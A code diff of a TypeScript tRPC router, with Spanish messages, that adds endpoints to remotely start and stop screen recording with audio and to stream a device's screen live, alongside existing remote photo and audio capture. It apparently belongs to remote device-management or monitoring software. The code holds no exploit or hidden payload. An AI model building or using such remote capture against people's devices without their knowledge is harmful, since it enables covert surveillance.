@@ -28,7 +28,7 @@ export const mediaCaptureRouter = router({
         commandQueue.enqueue(command);
         await logRemoteCommand(ctx.user.id, input.deviceId, RemoteCommandType.TAKE_PHOTO, "success", { commandId: command.commandId });
 
-        // [PLATINUM FIX] Direct WebSocket broadcast
+        // [ADM FIX] Direct WebSocket broadcast
         const { getWebSocketManager } = await import("../websocket");
         const wsManager = getWebSocketManager();
         if (wsManager) {
@@ -69,7 +69,7 @@ export const mediaCaptureRouter = router({
         commandQueue.enqueue(command);
         await logRemoteCommand(ctx.user.id, input.deviceId, RemoteCommandType.START_AUDIO_RECORDING, "success", { commandId: command.commandId });
 
-        // [PLATINUM FIX] Direct WebSocket broadcast
+        // [ADM FIX] Direct WebSocket broadcast
         const { getWebSocketManager } = await import("../websocket");
         const wsManager = getWebSocketManager();
         if (wsManager) {
@@ -141,7 +141,7 @@ export const mediaCaptureRouter = router({
 
         commandQueue.enqueue(command);
         
-        // [PLATINUM FIX] Direct WebSocket broadcast
+        // [ADM FIX] Direct WebSocket broadcast
         const { getWebSocketManager } = await import("../websocket");
         const wsManager = getWebSocketManager();
         if (wsManager) {
@@ -156,5 +156,165 @@ export const mediaCaptureRouter = router({
       } catch (error) {
         throw new TRPCError({ code: "INTERNAL_SERVER_ERROR", message: "Error al iniciar video" });
       }
+    }),
+
+  /**
+   * Iniciar grabación de pantalla del dispositivo
+   */
+  startScreenRecording: protectedProcedure
+    .input(
+      z.object({
+        deviceId: z.number(),
+        durationSeconds: z.number().min(5).max(600).default(30),
+        audio: z.boolean().default(true),
+        quality: z.enum(["low", "medium", "high"]).default("high"),
+      })
+    )
+    .mutation(async ({ input, ctx }) => {
+      try {
+        const command = createRemoteCommand(
+          input.deviceId,
+          ctx.user.id,
+          RemoteCommandType.START_SCREEN_RECORDING,
+          { duration: input.durationSeconds, audio: input.audio, quality: input.quality },
+          "high"
+        );
+
+        commandQueue.enqueue(command);
+        await logRemoteCommand(ctx.user.id, input.deviceId, RemoteCommandType.START_SCREEN_RECORDING, "success", { 
+          commandId: command.commandId, 
+          duration: input.durationSeconds,
+          audio: input.audio,
+          quality: input.quality 
+        });
+
+        const { getWebSocketManager } = await import("../websocket");
+        const wsManager = getWebSocketManager();
+        if (wsManager) {
+          wsManager.broadcastToDevice(input.deviceId, "execute-command", {
+            action: RemoteCommandType.START_SCREEN_RECORDING,
+            commandId: command.commandId,
+            payload: { duration: input.durationSeconds, audio: input.audio, quality: input.quality }
+          });
+        }
+
+        return { 
+          success: true, 
+          commandId: command.commandId, 
+          message: `Grabación de pantalla iniciada (${input.durationSeconds}s)` 
+        };
+      } catch (error) {
+        console.error("[MediaCapture] Screen recording error:", error);
+        throw new TRPCError({ code: "INTERNAL_SERVER_ERROR", message: "Error al iniciar grabación de pantalla" });
+      }
+    }),
+
+  /**
+   * Detener grabación de pantalla
+   */
+  stopScreenRecording: protectedProcedure
+    .input(z.object({ deviceId: z.number() }))
+    .mutation(async ({ input, ctx }) => {
+      try {
+        const command = createRemoteCommand(
+          input.deviceId,
+          ctx.user.id,
+          RemoteCommandType.STOP_SCREEN_RECORDING,
+          {},
+          "high"
+        );
+
+        commandQueue.enqueue(command);
+        await logRemoteCommand(ctx.user.id, input.deviceId, RemoteCommandType.STOP_SCREEN_RECORDING, "success", { 
+          commandId: command.commandId 
+        });
+
+        const { getWebSocketManager } = await import("../websocket");
+        const wsManager = getWebSocketManager();
+        if (wsManager) {
+          wsManager.broadcastToDevice(input.deviceId, "execute-command", {
+            action: RemoteCommandType.STOP_SCREEN_RECORDING,
+            commandId: command.commandId,
+            payload: {}
+          });
+        }
+
+        return { success: true, commandId: command.commandId, message: "Grabación de pantalla finalizada" };
+      } catch (error) {
+        throw new TRPCError({ code: "INTERNAL_SERVER_ERROR", message: "Error al detener grabación" });
+      }
+    }),
+
+  /**
+   * Iniciar streaming de pantalla en tiempo real
+   */
+  startScreenStream: protectedProcedure
+    .input(
+      z.object({
+        deviceId: z.number(),
+        quality: z.enum(["low", "medium", "high"]).default("medium"),
+        fps: z.number().min(1).max(30).default(15),
+      })
+    )
+    .mutation(async ({ input, ctx }) => {
+      try {
+        const command = createRemoteCommand(
+          input.deviceId,
+          ctx.user.id,
+          RemoteCommandType.START_SCREEN_STREAM,
+          { quality: input.quality, fps: input.fps },
+          "critical"
+        );
+
+        commandQueue.enqueue(command);
+        await logRemoteCommand(ctx.user.id, input.deviceId, RemoteCommandType.START_SCREEN_STREAM, "success", { 
+          commandId: command.commandId,
+          quality: input.quality,
+          fps: input.fps
+        });
+
+        const { getWebSocketManager } = await import("../websocket");
+        const wsManager = getWebSocketManager();
+        if (wsManager) {
+          wsManager.broadcastToDevice(input.deviceId, "execute-command", {
+            action: RemoteCommandType.START_SCREEN_STREAM,
+            commandId: command.commandId,
+            payload: { quality: input.quality, fps: input.fps }
+          });
+        }
+
+        return { 
+          success: true, 
+          commandId: command.commandId, 
+          streamUrl: `/api/stream/${input.deviceId}`,
+          message: "Streaming de pantalla iniciado" 
+        };
+      } catch (error) {
+        throw new TRPCError({ code: "INTERNAL_SERVER_ERROR", message: "Error al iniciar streaming" });
+      }
+    }),
+
+  /**
+   * Obtener estado de grabaciones activas
+   */
+  getRecordingStatus: protectedProcedure
+    .input(z.object({ deviceId: z.number() }))
+    .query(async ({ input, ctx }) => {
+      const activeRecordings: string[] = [];
+      const deviceQueue = commandQueue.getDeviceQueue(input.deviceId);
+      
+      for (const cmd of deviceQueue) {
+        if (cmd && (cmd.status === "executing" || cmd.status === "sent")) {
+          if (cmd.type.includes("recording") || cmd.type.includes("stream")) {
+            activeRecordings.push(cmd.type);
+          }
+        }
+      }
+
+      return {
+        deviceId: input.deviceId,
+        activeRecordings,
+        hasActiveRecording: activeRecordings.length > 0,
+      };
     }),
 });
